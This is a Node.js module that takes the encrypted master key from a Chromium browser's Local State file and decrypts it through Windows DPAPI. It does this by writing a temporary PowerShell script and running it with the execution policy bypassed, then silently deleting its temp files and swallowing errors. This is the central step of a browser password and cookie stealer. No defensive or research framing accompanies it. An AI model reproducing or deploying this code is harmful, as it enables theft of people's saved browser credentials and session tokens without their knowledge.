const { exec } = require('child_process');
const { promisify } = require('util');
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');

const execAsync = promisify(exec);

/**
 * Decrypts a DPAPI-protected blob using PowerShell to access Windows APIs.
 * @param {Buffer} encryptedData The encrypted DPAPI blob.
 * @returns {Promise<Buffer|null>} The decrypted data or null if it fails.
 */
async function decryptWithPowershell(encryptedData) {
    const tmpDir = os.tmpdir();
    const randomSuffix = crypto.randomBytes(4).toString('hex');
    
    const inputFile = path.join(tmpDir, `enc_${randomSuffix}.bin`);
    const outputFile = path.join(tmpDir, `dec_${randomSuffix}.bin`);
    const psFile = path.join(tmpDir, `dec_${randomSuffix}.ps1`);

    try {
        // Write the encrypted data to a temporary file
        fs.writeFileSync(inputFile, encryptedData);

        // Construct the PowerShell script to perform DPAPI unprotection
        const psScript = [
            'Add-Type -AssemblyName System.Security;',
            `$e = [System.IO.File]::ReadAllBytes('${inputFile}');`,
            '$d = [System.Security.Cryptography.ProtectedData]::Unprotect($e, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser);',
            `[System.IO.File]::WriteAllBytes('${outputFile}', $d);`,
            "[System.Console]::Write('DONE')"
        ].join('\n');

        fs.writeFileSync(psFile, psScript);

        // Execute the PowerShell script
        await execAsync(`powershell -ExecutionPolicy Bypass -File "${psFile}"`);

        if (fs.existsSync(outputFile)) {
            const decryptedData = fs.readFileSync(outputFile);
            return decryptedData;
        }
        return null;
    } catch (error) {
        return null;
    } finally {
        // Cleanup temporary files
        [inputFile, outputFile, psFile].forEach(file => {
            if (fs.existsSync(file)) {
                try { fs.unlinkSync(file); } catch (e) {}
            }
        });
    }
}

/**
 * Extracts and decrypts the master key from a Chromium browser's Local State file.
 * @param {string} localStatePath Path to the browser's Local State file.
 * @returns {Promise<Buffer|null>} The decrypted master key or null.
 */
async function extractDpapiKey(localStatePath) {
    try {
        if (!fs.existsSync(localStatePath)) return null;

        const localStateContent = fs.readFileSync(localStatePath, 'utf8');
        const localState = JSON.parse(localStateContent);

        if (!localState.os_crypt || !localState.os_crypt.encrypted_key) {
            return null;
        }

        let encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64');

        // Chromium master keys start with "DPAPI"
        if (encryptedKey.slice(0, 5).toString() !== 'DPAPI') {
            return null;
        }

        // Remove the "DPAPI" prefix
        encryptedKey = encryptedKey.slice(5);

        // Decrypt using Windows DPAPI via PowerShell
        return await decryptWithPowershell(encryptedKey);
    } catch (error) {
        return null;
    }
}

module.exports = {
    extractDpapiKey,
    decryptWithPowershell
};